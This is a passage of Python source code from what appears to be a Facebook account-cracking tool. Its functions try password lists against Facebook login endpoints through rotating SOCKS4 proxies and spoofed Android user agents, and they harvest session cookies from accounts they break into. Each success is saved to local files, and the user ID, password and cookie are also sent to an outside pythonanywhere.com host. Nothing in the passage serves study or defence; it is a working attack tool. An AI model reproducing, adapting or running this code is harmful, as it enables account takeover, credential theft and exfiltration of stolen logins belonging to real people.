                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pas,
                "login": "Log In"
            }
            header_freefb = {
                'authority': 'web.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': uat3,
            }
            lo = session.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=1169836009752131&kid_directed_site=0&app_id=1169836009752131&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.5%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26client_id%3D1169836009752131%26redirect_uri%3Dhttps%253A%252F%252Ftees.co.id%252F%26display%3Dpopup%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddf7a7932-3c56-46eb-8b8e-92236de08051%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftees.co.id%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[ZERO-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}💛{X1} " + coki)
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{coki}")
                    with open('/sdcard/ZERO-RNDM-OK.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|ZERO-LOCK| {uid} | {pas}')
                    #print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[ZERO-2F] {uid} [💙] {pas} ')
                    with open('/sdcard/ZERO-2F💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                 #   print(f'\r\033[1;30m[ZERO-CP] {uid} [💔] {pas} ')
                    with open('/sdcard/ZERO-CP.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1
#__________________| RANDOM METHOD M5 |__________________#
def rndm5(uid, passlist):
    global loop
    global cps
    global oks
    global proxy
    global ugen2
    for pas in passlist:
        try:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            sm_ml=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
            uaa3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm_ml))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r\r{R}[{abir}ZERO-M5{R}]{G}-{R}[{bo}%s{R}]{G}-{X}[{R}OK•%s{M1}/{Y}CP•{Y}%s{X}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            free_fb = session.get('https://touch.facebook.com').text
            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"',str(free_fb)).group(1),'try_number': re.search('name="try_number" value="(.*?)"',str(free_fb)).group(1),'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(free_fb)).group(1),'email': uid,'prefill_contact_point': pas,'prefill_source': 'browser_onload','prefill_type': 'contact_point','first_prefill_source': 'browser_dropdown','first_prefill_type': 'contact_point','had_cp_prefilled': 'true','had_password_prefilled': 'false','is_smart_lock': 'false','bi_xrwh': '0','encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),'fb_dtsg': '','jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), '__a': '','__user':0}
            header_freefb = {
                'authority': 'p.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'dpr': '2.9000000953674316',
                'referer': 'https://p.facebook.com/login.php?next=https%3A%2F%2Fp.facebook.com%2F&refsrc=deprecated&wtsid=rdr_0rUMBKuFVOobOGUjz&_rdr',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"TECNO CK7n"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"14.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': uaa3,
                'viewport-width': '980',
            }
            lo = session.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXV',data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[ZERO-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}💛{X1} " + coki)
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{coki}")
                    with open('/sdcard/ZERO-RNDM-OK.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|ZERO-LOCK| {uid} | {pas}')
                   # print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[ZERO-2F] {uid} [💙] {pas} ')
                    with open('/sdcard/ZERO-2F💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                    #print(f'\r\033[1;30m[ZERO-CP] {uid} [💔] {pas} ')
                    with open('/sdcard/ZERO-CP.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1

menu()